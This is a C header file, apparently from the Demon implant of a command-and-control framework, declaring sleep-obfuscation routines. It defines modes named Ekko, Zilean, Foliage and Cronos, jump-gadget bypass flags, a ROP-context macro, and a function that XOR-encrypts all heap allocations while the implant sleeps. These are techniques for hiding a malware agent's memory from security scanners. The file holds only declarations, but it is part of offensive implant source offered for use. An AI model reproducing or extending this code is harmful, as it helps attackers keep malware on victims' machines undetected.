
#ifndef DEMON_SLEEPOBF_H
#define DEMON_SLEEPOBF_H

#include <windows.h>

#define SLEEPOBF_NO_OBF  0x0
#define SLEEPOBF_EKKO    0x1
#define SLEEPOBF_ZILEAN  0x2
#define SLEEPOBF_FOLIAGE 0x3
/* ARC-03: Cronos-style timer-callback obfuscation (no suspended threads) */
#define SLEEPOBF_CRONOS  0x4

#define SLEEPOBF_BYPASS_NONE 0
#define SLEEPOBF_BYPASS_JMPRAX 0x1
#define SLEEPOBF_BYPASS_JMPRBX 0x2

#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {    \
        Rop[ i ].Rax = U_PTR( p );                  \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {  \
        Rop[ i ].Rbx = U_PTR( & p );                \
    } else {                                        \
        Rop[ i ].Rip = U_PTR( p );                  \
    }

typedef struct
{
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
} USTRING;

typedef struct _SLEEP_PARAM
{
    UINT32  TimeOut;
    PVOID   Master;
    PVOID   Slave;
} SLEEP_PARAM, *PSLEEP_PARAM;

VOID SleepObf( );

/* ARC-04: XOR-encrypt / decrypt all busy heap allocations with Key.
 * Calling this function twice with the same key restores the plaintext. */
VOID HeapEncryptDecrypt( PUCHAR Key, ULONG KeyLen );

#endif